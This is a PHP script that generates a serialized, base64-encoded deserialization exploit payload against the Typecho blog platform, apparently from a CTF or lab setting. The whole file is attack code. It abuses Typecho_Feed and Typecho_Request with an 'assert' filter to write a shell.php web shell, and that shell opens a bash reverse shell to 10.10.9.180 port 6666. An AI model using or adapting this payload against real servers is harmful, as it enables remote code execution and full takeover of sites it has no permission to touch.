<?php

class Typecho_Feed{
    private $_type = 'ATOM 1.0';
    private $_items = array();
    public function addItem(array $item){
        $this->_items[] = $item;
    }
}
class Typecho_Request{
    private $_params = array('screenName'=> "file_put_contents('shell.php','<?php system(\\'bash -i >& /dev/tcp/10.10.9.180/6666 0>&1\\');?>')");
    private $_filter = array('assert');
}
$payload1 = new Typecho_Feed();
$payload2 = new Typecho_Request();
$payload1->addItem(array('author' => $payload2));
$exp = array('adapter' => $payload1, 'prefix' => 'typecho');
// var_dump($exp);
// echo "\n";
// echo $exp;
echo serialize($exp);
// echo "\n";
echo base64_encode(serialize($exp));

?>

















